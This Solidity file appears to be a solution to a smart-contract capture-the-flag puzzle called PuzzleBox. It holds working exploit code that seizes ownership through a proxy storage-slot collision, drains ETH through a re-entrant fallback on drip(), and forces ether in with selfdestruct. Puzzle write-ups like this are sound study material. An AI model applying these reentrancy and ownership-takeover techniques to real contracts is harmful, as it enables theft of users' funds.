pragma solidity ^0.8.19;

import "./PuzzleBox.sol";

contract PuzzleBoxSolution {

    uint test;
    function solve(PuzzleBox puzzle) external {
        // How close can you get to opening the box?
        
        address factory = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;
        address proxy = address(puzzle);

        EoaSpoof eoaSpoof = new EoaSpoof(puzzle);
        eoaSpoof.reenterDrip();

        address payable[] memory friends = new address payable[](2);
        uint256[] memory friendsCutBps = new uint256[](friends.length);
        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
        friendsCutBps[0] = 0.015e4;
        friendsCutBps[1] = 0.0075e4;
        puzzle.spread(friends, friendsCutBps);

        eoaSpoof.destro();
        
        // puzzle.creep();
        
        uint256[] memory torchees = new uint[](5);
        torchees[0] = 2; 
        torchees[1] = 4;
        torchees[2] = 6;
        torchees[3] = 7;
        torchees[4] = 8;

        puzzle.torch(abi.encode(torchees));

        (bool r,) = proxy.call(abi.encode(puzzle.zip.selector));
    }
}

contract EoaSpoof {

    PuzzleBox puzzle;

    uint256 reentranceCounter;
    uint256 public test;
    
    constructor(PuzzleBox _puzzle) {
        puzzle = _puzzle;
        address payable proxy = payable(address(_puzzle));

        (bool a, bytes memory b) = proxy.call(hex'8da5cb5b'); // check PuzzleBoxProxy.owner storage slot
        _puzzle.operate(); // become operator / owner
        (bool c, bytes memory d) = proxy.call(hex'8da5cb5b'); // prove PuzzleBoxProxy.owner == PuzzleBox.operator
        
        // now that we are operator/owner we can unlock torch()
        PuzzleBoxProxy(proxy).lock(PuzzleBox.torch.selector, false);
    }

    function reenterDrip() external {
        // call drip and initiate reentrancy
        puzzle.drip{ value: 101 }();
    }

    function destro() external {
        selfdestruct(payable(address(puzzle)));
    }

    // fallback accepts drained ETH and exploits reentrancy vulnerability in puzzle's drip()
    fallback() external payable {
        reentranceCounter++;

        // reenter 10 times to raise lastDripId to 10
        if (reentranceCounter < 10) {
            puzzle.drip{ value: 101 }();
        }
        if (reentranceCounter == 10) {

            address(0x0).call{value: 33}('');
            test = address(this).balance;
        }
    }
}
